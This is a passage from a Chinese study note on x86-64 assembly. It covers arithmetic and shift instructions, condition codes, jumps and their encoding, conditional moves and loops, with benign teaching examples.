<p>弹出一个四字的操作包括从栈顶位置读出数据，然后将栈指针加8。但是<mark class="label primary">值0x123仍然会保持在内存位置0x100中，直到被覆盖（例如被另一条入栈操作覆盖）</mark>。无论如何，%rsp指向的地址总是栈顶。</p>
<h3 id="3-5-算术和逻辑操作"><a href="#3-5-算术和逻辑操作" class="headerlink" title="3.5 算术和逻辑操作"></a>3.5 算术和逻辑操作</h3><p>整数算术操作可分为以下四组：</p>
<ul>
<li>加载有效地址</li>
<li>一元操作（一个操作数）</li>
<li>二元操作（两个操作数）</li>
<li>移位</li>
</ul>
<p><img data-src="https://i.loli.net/2020/10/05/GilfVdCzq7k6P9R.png" alt="11整数算术操作.png"></p>
<p>事实上，给出的每个指令类都有对这四种不同大小数据的指令（只有<mark class="label primary">leaq</mark>没有其他大小的变种 ）。</p>
<h4 id="3-5-1-加载有效地址"><a href="#3-5-1-加载有效地址" class="headerlink" title="3.5.1 加载有效地址"></a>3.5.1 加载有效地址</h4><div class="note success"><p>加载有效地址(load effective address)指令<mark class="label success">leaq</mark>实际上是<mark class="label success">movq</mark>指令的变形。它的指令形式是从内存读数据到寄存器，<mark class="label danger">但实际上它根本就没有引用内存</mark>。它的第一个操作数看上去是一个内存引用，但该指令并不是从指定的位置读人数据，而是将<mark class="label primary">有效地址</mark>写人到目的操作数。另外，它还可以简洁地描述普通的算术操作。</p>
<p><code>leaq</code>既能进行取地址运算又能进行算术运算：</p>
<ul>
<li>假设寄存器<code>%rdx</code>的值是一个地址，寄存器<code>%eax</code>的值是一个整数数值，进行下列指令<ul>
<li><code>leaq 5(%rdx) %rax</code>：<code>%rax</code>的值是一个地址，此处并没有进行内存引用去取值</li>
<li><code>leaq 5(%eax) %rax</code>：<code>%rax</code>的值是一个整数数值</li>
</ul>
</li>
</ul>
<p>例如，如果寄存器<code>%rdx</code>的值为<code>x</code>，那么指令<code>leaq 7(%rdx,%rdx,4) %rax</code>将设置寄存器<code>%rax</code>的值为<code>5x + 7</code>。编译器经常发现<code>leaq</code>的些灵活用法，<strong>根本就与有效地址计算无关，目的操作数必须 是一个寄存器</strong>。</p>
</div>

<h4 id="3-5-2-一元操作和二元操作"><a href="#3-5-2-一元操作和二元操作" class="headerlink" title="3.5.2 一元操作和二元操作"></a>3.5.2 一元操作和二元操作</h4><div class="note default"><ul>
<li>一元操作，只有一个操作数，既是源又是目的。这个操作数可以是一个寄存器，也可以是一个内存位置。比如说，指令<code>incq(%rsp)</code>会使栈顶的8字节元素加1。</li>
<li>二元操作，第二个操作数既是源又是目的。<ul>
<li>第一个操作数可以是立即数、寄存器或是内存位置。</li>
<li>第二个操作数可以是寄存器或是内存位置。（注意， <strong>当第二个操作数为内存地址时，处理器必须从内存读出值，执行操作，再把结果写回内存</strong>。）</li>
</ul>
</li>
</ul>
</div>



<h4 id="3-5-3-移位操作"><a href="#3-5-3-移位操作" class="headerlink" title="3.5.3 移位操作"></a>3.5.3 移位操作</h4><ol>
<li>移位操作，先给出移位量，然后第二项给出的是要移位的数。可以进行算术和逻辑右移。</li>
<li>移位量可以是一个立即数，或者放在单字节寄存器<mark class="label primary">%cl</mark>中。<mark class="label warning">（这些指令很特别，因为只允许以这个特定的寄存器作为操作数）</mark></li>
<li><code>%cl</code>的值为一个字节，1个字节的移位量使得移位量的编码范围可以达到 $2^8-1&#x3D;255$ 位。</li>
<li>x86-64中，对 $w$ 位长的数据值进行移位操作时，移位量是由寄存器<code>%cl</code>的低 $m$ 位决定的，这里$2^m&#x3D;w$。高位会被忽略。即：对于 $w$ 位的数据进行移位, 并不是直接使用<code>%cl</code>的值, 而是使用<code>%cl</code>的低 $m$ 位的值，2的 $m$ 次幂等于当前操作位数的大小，大于 $m$ 的位会被忽略。</li>
<li>当寄存器<code>%cl</code>的十六进制值为 0xFF 时：</li>
</ol>
<table>
<thead>
<tr>
<th align="center">命令</th>
<th align="center">等式</th>
<th align="center">有效位</th>
<th align="center">移位量</th>
</tr>
</thead>
<tbody><tr>
<td align="center">salb</td>
<td align="center">$2^3&#x3D;8$</td>
<td align="center">11111<mark class="label success">111</mark></td>
<td align="center">111&#x3D;7</td>
</tr>
<tr>
<td align="center">salw</td>
<td align="center">$2^4&#x3D;16$</td>
<td align="center">1111 <mark class="label success">1111</mark></td>
<td align="center">1111&#x3D;15</td>
</tr>
<tr>
<td align="center">sall</td>
<td align="center">$2^5&#x3D;32$</td>
<td align="center">111<mark class="label success">11111</mark></td>
<td align="center">11111&#x3D;31</td>
</tr>
<tr>
<td align="center">salq</td>
<td align="center">$2^6&#x3D;64$</td>
<td align="center">11<mark class="label success">111111</mark></td>
<td align="center">111111&#x3D;63</td>
</tr>
</tbody></table>
<ol start="6">
<li>左移指令有两个名字：<code>SAL</code>和<code>SHL</code>。两者的效果是一样的，都是将右边填上0。右移指令不同，<code>SAR</code>执行算术移位(填上符号位)，而<code>SHR</code>执行逻辑移位(填上0)。<strong>移位操作的目的操作数可以是一个寄存器或是一个内存位置</strong>。</li>
<li>图3-10所示的大多数指令，既可以用于无符号运算，也可以用于补码运算。<mark class="label danger">只有右移操作要求区分有符号和无符号数</mark>。这个特性使得补码运算成为实现有符号整数运算的一种比较好的方法的原因之一。</li>
</ol>
<p><img data-src="https://i.loli.net/2020/10/08/eKi1gypYuSIAxOs.png" alt="12算术运算与汇编.png"></p>
<h4 id="3-5-4-乘法和除法"><a href="#3-5-4-乘法和除法" class="headerlink" title="3.5.4 乘法和除法"></a>3.5.4 乘法和除法</h4><div class="note primary"><p><strong>注意，一个a位的操作数和一个b位的操作数，产生的乘积是a+b位的操作数</strong></p>
</div>

<p>两个 64 位有符号或无符号整数相乘得到的乘积需要 128 位来表示。x86-64 指令集对 128 位（16字节）数的操作提供有限的支持。 <mark class="label danger">故使用寄存器%rdx和%rax来组成一个128位的八字来保存乘法产生的128位积或者除法的被除数的高64位和低64位或者除法产生的商和余数</mark>  图 3-12 描述的是支持产生两个 64 位数字的全 128 位乘积以及整数除法的指令。</p>
<p><img data-src="https://i.loli.net/2020/10/08/nTdwNpa7mgizOYU.png" alt="13特殊的算术操作.png"></p>
<div class="note primary"><p><code>imulq</code>属于<code>IMUL</code>指令类，该指令有两种不同的形式。其中一种，如图3-10 所示，是<mark class="label warning">双操作数</mark>乘法指令。它从两个 64 位操作数产生一个 128 位乘积。而另一种属于<mark class="label warning">单操作数</mark>乘法指令的有符号乘法（补码乘法）。<code>x86-64</code>提供了两条单操作数乘法：</p>
<ul>
<li><mark class="label primary">imulq</mark>：补码乘法</li>
<li><mark class="label primary">mulq</mark>：无符号乘法</li>
</ul>
<p>这两条指令都要求<mark class="label success">一个参数必须在寄存器 %rax 中</mark>，而另一个作为指令的源操作数给出。 </p>
<p><strong>乘法中</strong>：乘积存放在寄存器<mark class="label default">%rdx</mark>（高64位）和  <mark class="label default">%rax</mark>（低64位）中。虽然<code>imulq</code> 这个名字可以用于两个不同的乘法操作，但是汇编器能够通过计算操作数的数目，分辨出想用哪条指令。</p>
<p><strong>除法中</strong>：</p>
<ul>
<li>有符号除法指令<code>idivl</code> 将寄存器<mark class="label default">%rdx</mark>（高64位)）和<mark class="label default">%rax</mark>（低64位）中的128 位数作为被除数，而除数作为指令的操作数给出。</li>
<li>指令将商存储在寄存器<mark class="label default">%rax</mark>中，将余数存储在寄存器<mark class="label default">%rdx</mark>中。</li>
<li>当一个64 位的数作为被除数时，需要将其扩展为 128 位，由于寄存器<code>%rdx</code>存放高64位，则需要分为有符号除法还是无符号除法。<ul>
<li>无符号运算：<code>%rdx</code>的位应该设置为全0 </li>
<li>有符号运算：<code>%rdx</code>的位应该设置为<code>%rax</code>的符号位，使用<code>cqto</code>指令来完成这一操作，这条指令不需要操作数--&gt;它隐含读出<code>%rax</code>的符号位， 并将它复制到<code>%rdx</code>的所有位。</li>
</ul>
</li>
</ul>
</div>



<h3 id="3-6-控制"><a href="#3-6-控制" class="headerlink" title="3.6 控制"></a>3.6 控制</h3><p>机器代码提供两种基本的低级机制来实现有条件的行为：测试数据值，然后根据测试的结果来改变<strong>控制流</strong>或者<strong>数据流</strong>。</p>
<h4 id="3-6-1-条件码（标志寄存器）"><a href="#3-6-1-条件码（标志寄存器）" class="headerlink" title="3.6.1 条件码（标志寄存器）"></a>3.6.1 条件码（标志寄存器）</h4><p>除了整数寄存器，CPU还维护着一组单个位（一位，值为0或1）的条件码（condition code） 寄存器，它们描述了最近的算术或逻辑操作的属性。可以检测这些寄存器来执行条件分支指令。</p>
<div class="note info"><p>最常用 的条件码有：</p>
<ul>
<li>CF：进位标志。最近的操作使最高位产生了进位。可用来检查无符号操作的溢出。 </li>
<li>ZF：零标志。最近的操作得出的结果为0。</li>
<li>SF：负数符号标志。最近的操作得到的结果为负数。</li>
<li>OF：溢出标志。最近的操作导致一个补码溢出--&gt;正溢出或负溢出。</li>
</ul>
</div>

<div class="note danger"><p><strong>正溢出与负溢出</strong>：</p>
<p>首先，一个正数与一个负数相加，不可能溢出，因为结果的绝对值一定小于两个加数的绝对值，既然两个加数能合理表示出来，结果一定也能合理表示出来。</p>
<ul>
<li><strong>正溢出是由于两个很大的正数相加，导致符号位变成1的情况</strong>。如 $0110+0011&#x3D;1001$（假设最大只能运算4位）</li>
<li><strong>负溢出则是两个很小的负数相加，导致符号位变成0的情况</strong>。如 1011(-5)+1011(-5)&#x3D;10110-&gt;0110​ （溢出）；如 $1111(-1)+1111(-1)&#x3D;11110-&gt;1110$ 则没溢出。</li>
</ul>
<p>　因此：</p>
<ul>
<li>正溢出的判断标准是符号位或最高位有进位</li>
<li>负溢出的判断标准是符号位和最高位只有一个发生了进位。符号位和最高位同时发生进位则没溢出。（注意，这里的最高位指的是去掉符号位后的最高位，即符号位后面一位。）</li>
</ul>
</div>

<p><code>leaq</code>指令不改变任何条件码，因为它是用来进行地址计算的。除此之外，<mark class="label warning">图3-10中列出的所有指令都会设置条件码</mark> </p>
<p>对于逻辑操作：</p>
<ul>
<li><code>XOR</code>，进位标志和溢出标志会设置成 0 </li>
<li>移位操作，进位标志将设置为最后一个被移出的位，而溢出标志设置为 0</li>
<li><code>INC</code>和<code>DEC</code>指令会设置溢出和零标志，但是不会改变进位标志</li>
</ul>
<p><code>CMP</code>和<code>TEST</code>类指令只设条件码而不改变任何其他寄存器。</p>
<ul>
<li><code>CMP</code>和<code>SUB</code>指令的行为是一样的，但是<code>CMP</code>指令只设条件码而不更新目的寄存器。如果两个操作数相等，这些指令会将零标志设置为1 ，而其他标志可以用来确定两个操作数的大小关系。</li>
<li><code>TEST</code>和<code>AND</code>指令的行为是一样的，但是<code>TEST</code>指令只设条件码而不更新目的寄存器。典型的用法是，两个操作数是一样的（例如，<code>testq %rax,%rax</code>用来检查<code>%rax</code>是负数、零还是正数），或其中一个操作数是掩码，用来指示哪些位应该被测试。</li>
<li><code>CMP</code>指令会设置进位标志，因为无符号比较使用的是进位标志（CF）和零标志（ZF）的组合。</li>
</ul>
<span id="cmptest">

<table>
<thead>
<tr>
<th align="center">指令</th>
<th align="center">基于</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">CMP  $S_1 , S_2$</td>
<td align="center">$S_2 - S_1$</td>
<td align="center">比较</td>
</tr>
<tr>
<td align="center">cmpb</td>
<td align="center"></td>
<td align="center">比较字节</td>
</tr>
<tr>
<td align="center">cmpw</td>
<td align="center"></td>
<td align="center">比较字</td>
</tr>
<tr>
<td align="center">cmpl</td>
<td align="center"></td>
<td align="center">比较双字</td>
</tr>
<tr>
<td align="center">cmpq</td>
<td align="center"></td>
<td align="center">比较四字</td>
</tr>
<tr>
<td align="center">TEST  $S_1 , S_2$</td>
<td align="center">$S_1 $ &amp; $S_2$</td>
<td align="center">测试</td>
</tr>
<tr>
<td align="center">testb</td>
<td align="center"></td>
<td align="center">测试字节</td>
</tr>
<tr>
<td align="center">testw</td>
<td align="center"></td>
<td align="center">测试字</td>
</tr>
<tr>
<td align="center">testl</td>
<td align="center"></td>
<td align="center">测试双字</td>
</tr>
<tr>
<td align="center">testq</td>
<td align="center"></td>
<td align="center">测试四字</td>
</tr>
</tbody></table>
</span>

<p><a href="#cmptest"><img data-src="https://img.shields.io/badge/%E6%AF%94%E8%BE%83%E5%92%8C%E6%B5%8B%E8%AF%95%E6%8C%87%E4%BB%A4-%E5%9B%BE_3%E2%80%9413-1fd0f6.svg?colorA=ff69b4" alt="1"></a></p>
<h4 id="3-6-2-访问条件码"><a href="#3-6-2-访问条件码" class="headerlink" title="3.6.2 访问条件码"></a>3.6.2 访问条件码</h4><p>条件码通常不会直接读取，常用的使用方法有三种：</p>
<ul>
<li>可以根据条件码的某种组合， 将一个字节设置为0或者1</li>
<li>可以条件跳转到程序的某个其他的部分</li>
<li>可以有条件地传送数据</li>
</ul>
<ol>
<li>对于第一种情况，图 3-14 中描述的<mark class="label primary">指令根据条件码的某种组合，将一个字节设置为 0 或者 1</mark>。我们将这一整类指令称为SET指令；</li>
<li>它们之间的区别就在于它们考虑的<strong>条件码的组合</strong>是什么，这些指令名字的不同后缀指明了它们所考虑的条件码的组合。</li>
<li><strong>这些指令的后缀表示不同的条件而不是操作数大小</strong>，了解这一点很重要。例如，指令<code>setl </code>和 <code>setb</code>表示“小于时设置（set less）” 和“低于时设置（set below）”，而不是“设置长字（set long word）”和“设置字节（set byte）”。</li>
</ol>
<p>一条<code>SET</code>指令的<mark class="label info">目的操作数</mark>是低位单字节寄存器元素（图3-2）之一，或是一个字节的内存位置，指令会将这个字节设置成 0 或者 1。为了得到一个 32 位或 64 位结果，我们必须对<mark class="label warning">高位清零</mark>。</p>
<p><img data-src="https://i.loli.net/2020/10/09/peA6YDikbzqPVOd.png" alt="15SET指令.png"></p>
<div class="note warning"><p><code>CMP</code>指令会设置进位标志，因为无符号比较使用的是进位标志（CF）和零标志（ZF）的组合。</p>
</div>

<h4 id="3-6-3-跳转指令"><a href="#3-6-3-跳转指令" class="headerlink" title="3.6.3 跳转指令"></a>3.6.3 跳转指令</h4><p>跳转指令（<code>jump</code>）会使正在执行的指令切换到程序中一个全新的位置。跳转的目的地通常用一个标号（label）指明。</p>
<div class="note success"><p>在产生目标代码文件时，汇编器会确定所有带标号指令的地址，并将跳转目标（目的指令的地址）编码为跳转指令的一部分。</p>
</div>

<mark class="label danger">jmp指令是无条件跳转的</mark> 分为直接跳转和间接跳转

<ul>
<li>直接跳转：跳转目标是作为指令的一部分编码的，直接跳转是给出一个标号作为跳转目标的</li>
<li>间接跳转：跳转目标是从寄存器或内存位置中读出。间接跳转的写法是 <code>jmp *Operand</code> ，<code>*</code>后跟一个操作数指示符</li>
</ul>
<p>JCC：有条件跳转</p>
<p>JMP：无条件跳转</p>
<ul>
<li><code>jmp .L1</code>：跳转到<code>L1</code>标号</li>
<li><code>jmp *%rax</code>：用寄存器<code>%rax</code>中的值作为跳转目标</li>
<li><code>jmp *(%rax)</code>：以<code>%rax</code>中的值做为读地址，从内存中读出跳转目标</li>
</ul>
<p><img data-src="https://i.loli.net/2020/10/10/wF6uXslOJ8EGhNC.png" alt="16jmp指令.png"></p>
<h4 id="3-6-4-跳转指令的编码"><a href="#3-6-4-跳转指令的编码" class="headerlink" title="3.6.4 跳转指令的编码"></a>3.6.4 跳转指令的编码</h4><p>这里的编码指的是机器码，研究跳转指令的汇编代码如何编译为机器代码，然后与地址联系起来。</p>
<div class="note success"><p><strong><code>jmp .L1</code>：<code>.L1</code>是跳转目标，它的机器编码称为目标编码。这整条指令的编码 &#x3D; <code>jmp</code>的编码（eb）+<code>.L1</code>的编码</strong></p>
</div>

<p>跳转指令的编码分为： </p>
<ul>
<li><strong>PC相对的</strong>（PC-relative）。将目标指令的地址与紧跟在跳转指令后面那条指令的地址之间的差作为编码【跳转指令的目标编码（偏移量） &#x3D; 目标指令的地址（要跳到的地址） $-$ 跳转指令后面那条指令的地址（程序计数器的值）】。这些地址偏移量可以编码为 1、2、4 个字节。程序计数器的值是跳转指令后面的那条指令的地址，而不是跳转指令本身的地址。 </li>
<li><strong>绝对地址</strong>，用 4 个字节直接指定目标，汇编器和连接器会选择适当的跳转目的编码。</li>
</ul>
<p>PC相对编码例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">（汇编代码）</span><br><span class="line">movq    %rdi, %rax </span><br><span class="line">jmp     .L2 </span><br><span class="line">.L3: </span><br><span class="line">  sarq  %rax</span><br><span class="line">.L2: </span><br><span class="line">  testq %rax, %rax </span><br><span class="line">  jg    .L3 </span><br><span class="line">  rep;  ret</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">（机器代码的反汇编版本）</span><br><span class="line">    <span class="number">0</span>:   <span class="number">48</span> <span class="number">89</span> f8                       mov     %rdi, %rax </span><br><span class="line">    <span class="number">3</span>:   eb <span class="number">03</span>                          jmp     <span class="number">8</span> &lt;loop+<span class="number">0x8</span>&gt;</span><br><span class="line">    <span class="number">5</span>:   <span class="number">48</span> d1 f8                       sar     %rax </span><br><span class="line">    <span class="number">8</span>:   <span class="number">48</span> <span class="number">85</span> c0                       test    %rax, %rax </span><br><span class="line">    b:   <span class="number">7f</span> f8                          jg      <span class="number">5</span> &lt;loop+<span class="number">0x5</span>&gt; </span><br><span class="line">    d:   f3 с<span class="number">3</span>                          repz retq</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">（链接后的程序反汇编版本）</span><br><span class="line">    <span class="number">4004</span>d0:   <span class="number">48</span> <span class="number">89</span> f8                  mov     %rdi, %rax </span><br><span class="line">    <span class="number">4004</span>d3:   eb <span class="number">03</span>                     jmp     <span class="number">4004</span>d8 &lt;loop+<span class="number">0x8</span>&gt;</span><br><span class="line">    <span class="number">4004</span>d5:   <span class="number">48</span> d1 f8                  sar     %rax </span><br><span class="line">    <span class="number">4004</span>d8:   <span class="number">48</span> <span class="number">85</span> c0                  test    %rax, %rax </span><br><span class="line">    <span class="number">4004</span>db:   <span class="number">7f</span> f8                     jg      <span class="number">4004</span>d5 &lt;loop+<span class="number">0x5</span>&gt; </span><br><span class="line">    <span class="number">4004</span>dd:   f3 с<span class="number">3</span>                     repz retq</span><br></pre></td></tr></table></figure>



<div class="note primary"><p>对于机器代码的反汇编版本：</p>
<ul>
<li><p><mark class="label success">反汇编器以十六进制格式给出所有的数字</mark> </p>
</li>
<li><p><code>jmp</code>指令后的大小数字、机器代码或地址全都是以<mark class="label success">补码</mark>的形式给出</p>
</li>
<li><p>右边反汇编器产生的注释中，第2行中跳转指令的跳转目标指明为<code>0x8</code>，第5行中跳转指令的跳转目标是<code>0x5</code>。</p>
</li>
</ul>
<p>根据计算公式：</p>
<ul>
<li>第一条跳转指令的目标编码（在第二个字节中)为 <code>0x3</code> （偏移量或目标编码）是由 <code>0x8 - 0x5</code> 得到（<code>0x8</code>是要跳到的地址，<code>0x5</code>是跳转指令后面那条指令的地址或程序计数器的值）</li>
<li>第二条跳转指令的目标编码 <code>0xf8</code> 是由 <code>0x5 - 0xd</code> 得到。由于是以补码的形式给出，则<code>0xf8</code>表示十进制的<code>-8</code>。</li>
</ul>
<p>对于第一条跳转指令机器代码的反汇编版本： <code>3:  eb 03       jmp  8 &lt;loop+0x8&gt;</code>  ：</p>
<ul>
<li><code>3:</code>：指令<code>jmp  8 &lt;loop+0x8&gt;</code>装载前的地址，值为 <code>0x3</code>，是补码形式</li>
<li><code>eb 03</code>：即为指令<code>jmp  8 &lt;loop+0x8&gt;</code>的指令编码（只需要两个字节，<code>eb</code>是低字节、<code>03</code>是高字节）</li>
<li><code>eb</code>：是<code>jmp</code>指令的（机器）编码，是补码形式</li>
<li><code>03</code>：<code>jmp</code>指令跳转目标的编码，也叫做偏移量，是补码形式</li>
</ul>
<p>注意：AMD 建议用<code>rep</code>后面跟<code>ret</code>的组合来避免使<code>ret</code>成为条件跳转指令的目标。如果没有<code>rep</code>，当分支不跳转时，<code>jg</code>指令会继续到<code>ret</code>指令。（<code>rep</code>或<code>repz</code>是同义名，<code>retq</code>和<code>ret</code>是同义名。以后遇到<code>rep</code>或<code>repz</code>就直接无视掉。）</p>
</div>



<h4 id="3-6-5-用条件控制来实现条件分支"><a href="#3-6-5-用条件控制来实现条件分支" class="headerlink" title="3.6.5 用条件控制来实现条件分支"></a>3.6.5 用条件控制来实现条件分支</h4><p>本节主要探讨C语言中<code>if-else</code>到汇编的转换：一般使用测试语句或者比较语句 --&gt;<code>CMP</code>、<code>TEST</code></p>
<p>C语言中<code>if-else</code>语句的通用形式模版如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (test-expr)</span><br><span class="line">    then-statement</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">else</span>-statement</span><br></pre></td></tr></table></figure>



<p>用C语言来描述汇编代码的程序控制流：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> t = test-expr;</span><br><span class="line">    <span class="keyword">if</span> (!t)</span><br><span class="line">        <span class="keyword">goto</span> <span class="literal">false</span>;</span><br><span class="line">    then-statement</span><br><span class="line">    <span class="keyword">goto</span> done;</span><br><span class="line"><span class="literal">false</span>:</span><br><span class="line">    <span class="keyword">else</span>-statement</span><br><span class="line">done:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2020/10/12/GlaFLrhc1EtXUvZ.png" alt="17条件语句的编译.png"></p>
<p>练习题<code>3.18</code>，从如下形式的 C 语言代码开始：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">test</span><span class="params">(<span class="keyword">long</span> x, <span class="keyword">long</span> y, <span class="keyword">long</span> z)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> val = ___________;</span><br><span class="line">    <span class="keyword">if</span> (______) &#123;</span><br><span class="line">        <span class="keyword">if</span> (______)</span><br><span class="line">            val = ______;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            val = ______;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (______)</span><br><span class="line">        val = ______;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>GCC 产生如下的汇编代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># long test(long x, long y, long z)</span></span><br><span class="line"><span class="meta"># x in %rdi, y in %rsi, z in %rdx</span></span><br><span class="line">test:</span><br><span class="line">	leaq  (%rdi, %rsi), %rax  <span class="meta"># long temp1 = x + y</span></span><br><span class="line">	addq  %rdx, %rax          # temp1 = temp1 + z</span><br><span class="line">	cmpq  $<span class="number">-3</span>, %rdi           # 比较 x 和 <span class="number">-3</span></span><br><span class="line">	jge   .L2                 <span class="meta"># x &gt;= -3 时跳转到 L2</span></span><br><span class="line">	cmpq  %rdx, %rsi          # 比较 y 和 z</span><br><span class="line">	jge   .L3                 <span class="meta"># y &gt;= z 时跳转到 L3</span></span><br><span class="line">	movq  %rdi, %rax          # temp1 = x</span><br><span class="line">	imulq %rsi, %rax          # temp1 = temp1 * y</span><br><span class="line">	ret                       <span class="meta"># return</span></span><br><span class="line">.L3:</span><br><span class="line">  movq  %rsi, %rax          # 此时 x &lt; <span class="number">-3</span>，y &gt;= z；temp1 = y</span><br><span class="line">  imulq %rdx, %rax          # temp1 = temp1 * z</span><br><span class="line">  ret                       <span class="meta"># return</span></span><br><span class="line">.L2:</span><br><span class="line">  cmpq  $<span class="number">2</span>, %rdi            # 此时 x &gt;= <span class="number">-3</span>；比较 x 和 <span class="number">2</span></span><br><span class="line">  jle   .L4                 <span class="meta"># x &lt;= 2 时跳转到 L4</span></span><br><span class="line">  movq  %rdi, %rax          # temp1 = x</span><br><span class="line">  imulq %rdx, %rax          # temp1 = temp1 * z</span><br><span class="line">.L4:</span><br><span class="line">  rep; ret</span><br></pre></td></tr></table></figure>

<p>填写 C 代码中缺失的表达式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">test</span><span class="params">(<span class="keyword">long</span> x, <span class="keyword">long</span> y, <span class="keyword">long</span> z)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> val = x + y + z;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">-3</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (y &lt; z)</span><br><span class="line">            val = x * y;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            val = y * z;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x &gt; <span class="number">2</span>) </span><br><span class="line">        val = x * z;</span><br><span class="line">   <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="3-6-6-用条件传送来实现条件分支"><a href="#3-6-6-用条件传送来实现条件分支" class="headerlink" title="3.6.6 用条件传送来实现条件分支"></a>3.6.6 用条件传送来实现条件分支</h4><p><code>3.6.5</code>中使用的是<code>控制</code>的条件转移，虽然简单通用，但是条件码分支对于现代CPU效率比较低。所以<code>3.6.6</code>使用<code>数据</code>的条件转移，与使用控制的条件转移执行效果相同，但是会提前计算出结果的值然后进行分支预测。这种方法在条件计算量相对较小的情况下（两个表达式都很容易计算，例如分别都是一条加法指令），才会使用条件传送。</p>
<ul>
<li>因为处理器通过使用“流水线”来获得高性能，而流水线需要事先确定要执行的指令序列，遇到条件分支时需要采用“分支预测逻辑”来猜测每条跳转指令是否会执行。若猜错，需要处理器丢掉这些已经做好的工作，浪费大约15~30个时钟周期。</li>
<li>假设预测错误的概率是$p$，如果没有预测错误，执行代码的时间是$T_{OK}$，否则是$T_{MP}$，则执行代码的平均时间$T_{avg} &#x3D; T_{OK} + p * T_{MP}$，推导出$T_{MP}&#x3D;2(T_{ran}-T_{OK})$</li>
</ul>
<p><img data-src="https://i.loli.net/2020/10/12/ZKRX5yFUPzh81Eu.png" alt="18条件传送指令.png"></p>
<ul>
<li><code>cmov*</code>：--&gt; <code>cmov</code>指条件传送，<code>*</code>是指令后缀，与<code>SET</code>、<code>JMP</code>指令类一样。</li>
<li>有两个操作数：第一个操作数是源操作数，可以是寄存器或者内存，第二个操作数是目的，只能是寄存器。</li>
<li>功能：只有在指定的条件满足时（结合<code>TEST</code>、<code>JMP</code>），才会将源值复制到目的寄存器中。</li>
<li>指令类<mark class="label warning">不支持单字节的条件传送</mark> ，源和目的的值可以是16位、32位、64位。</li>
<li>汇编器可以从目标寄存器的名字推断出条件传送指令的操作数长度，所以对所有的操作数长度，都可以使用同一个的指令名字。</li>
</ul>
<p>条件控制转移编译与条件传送编译对比：</p>
<p>C语言形式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v = test-expr ? then-expr : <span class="keyword">else</span>-expr;</span><br></pre></td></tr></table></figure>

<p>条件控制转移形式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> (!test-expr)</span><br><span class="line">        <span class="keyword">goto</span> <span class="literal">false</span>;</span><br><span class="line">    v = then-expr</span><br><span class="line">    <span class="keyword">goto</span> done;</span><br><span class="line"><span class="literal">false</span>:</span><br><span class="line">    v = <span class="keyword">else</span>-expr;</span><br><span class="line">done:</span><br></pre></td></tr></table></figure>

<p>条件传送形式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v = then-expr;</span><br><span class="line">ve = <span class="keyword">else</span>-expr;</span><br><span class="line">t = test-expr;</span><br><span class="line"><span class="keyword">if</span> (!t) v = ve;</span><br></pre></td></tr></table></figure>

<p>基于条件传送的代码，会对$then-rexpr$和$else-expr$都求值，最终值的选择基于对$test-expr$的求值。</p>
<ul>
<li>不是所有的条件表达式都可以用传送条件来编译。如果<code>then-expr</code>或<code>else-expr</code>可能产生错误条件或副作用，会导致非法的行为。（如给全局变量赋值、<code>return p ? *p : 0;</code>等）</li>
<li>条件传送并不总是会提高代码的效率。编译器一般只在两个表达式都很容易计算且没有副作用时才会使用。</li>
</ul>
<h4 id="3-6-7-循环"><a href="#3-6-7-循环" class="headerlink" title="3.6.7 循环"></a>3.6.7 循环</h4><p>C语言提的循环结构：</p>
<ul>
<li><code>do-while</code></li>
<li><code>while</code></li>
<li><code>for</code></li>
</ul>
<p>汇编中没有相应的指令存在，可以用<mark class="label success">条件测试</mark> 和 <mark class="label success">跳转</mark> 组合起来实现循环的效果。</p>
<h5 id="do-while-循环"><a href="#do-while-循环" class="headerlink" title="do-while 循环"></a>do-while 循环</h5><p>C语句：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">    body-statement</span><br><span class="line">    <span class="keyword">while</span> (test-expr);</span><br></pre></td></tr></table></figure>

<p>汇编：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">loop:</span><br><span class="line">    body-statement</span><br><span class="line">    t = test-expr;</span><br><span class="line">    <span class="keyword">if</span> (t)</span><br><span class="line">        <span class="keyword">goto</span> loop;</span><br></pre></td></tr></table></figure>

<p>这个循环的效果就是重复执行$body-statement$，对$test-expr$求值，如果求值的结果为非零，就继续循环。可以看到，$body-statement$ 至少会执行一次。</p>
<p><img data-src="https://i.loli.net/2020/10/12/apLOlDxZesBXtKg.png" alt="1B阶乘dowhile.png"></p>
<h5 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h5><p>有很多种方法将<code>while</code>循环翻译成机器代码，GCC在代码生成中使用其中的<strong>两种方法</strong>。这两种方法使用同样的循环结构，与<code>do-while</code>一样，不过它们实现初始测试的方法不同。</p>
<ul>
